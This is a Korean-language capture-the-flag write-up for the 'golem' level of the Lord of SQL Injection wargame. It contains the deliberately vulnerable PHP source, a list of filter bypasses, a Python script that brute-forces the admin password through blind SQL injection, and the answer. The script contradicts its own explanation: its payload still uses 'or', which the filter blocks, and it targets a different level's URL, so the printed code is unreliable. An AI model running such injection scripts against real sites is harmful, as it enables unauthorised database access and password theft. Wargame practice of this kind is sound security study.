# Lord of SQL Injection No.11 - golem

## 문제 출제 의도

substr()함수를 우회하여 =과 or, and를 우회하여 Blind SQL Injection을 풀줄 안다.

## 소스 코드 분석
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
  highlight_file(__FILE__); 
?>
```
* preg_match 를 통해 'prob','_','.','()','or','and','substr(','=' 를 걸러낸다.

* 위 query 스트링으로 pw자리에 입력하게 된다.

* addslashes로 DB 상에서 쓰이는 ', ", \, NULL 같은 질의 문자들의 앞에 \를 붙힌 문자열을 반환한다.

* DB의 id = admin에 해당하는 pw값과 GET 방식으로 입력하는 pw의 값이 일치하면 문제풀이에 성공한다.

## 문제 해결 방안

* length 함수로 pw에 해당하는 문자열을 안다.

* or , and , substr( , = 를 필터링 하므로 or >> || , and >> &&, substr( >> substring( , = >> LIKE 로 치환하며 푼다.

```python
import urllib.request   # python 라이브러리에 내장된 urllib.request 를 불러온다.
from urllib.parse import quote

result = "" # pw 값을 저장할 문자열 변수

for i in range(1,9):
    for j in range(ord('0'),ord('z')):
        url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw="  # SQL Injection 공격 대상인 URL에서 변경되지 않는 부분이다.
        add_url = "' or id like 'admin' || substring(pw,1,{}) like '{}' -- ;".format(str(i), result+chr(j)) 
        print("Searching.. - {0}{1}".format(url, add_url))
        add_url = quote(add_url)
        new_url = url + add_url
        re = urllib.request.Request(new_url)

        re.add_header("User-Agent","Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=ae1i7c038nndgup1torche1pt7")

        res = urllib.request.urlopen(re) # re < url에 해당하는 html데이터를 문자열로 반환한다.

        if str(res.read()).find("Hello admin") != -1: # 거기서 Hello admin이라는 문자열을 읽는다
            result += chr(j).lower()
            print("Found it!! => " + result)
            break

print("Finished Searching.")
print("Password : " + result)
```

를 통하여 문제의 해답을 구할 수 있고 그것을 …?pw like 88e3137f해줄경우 문제가 해결된다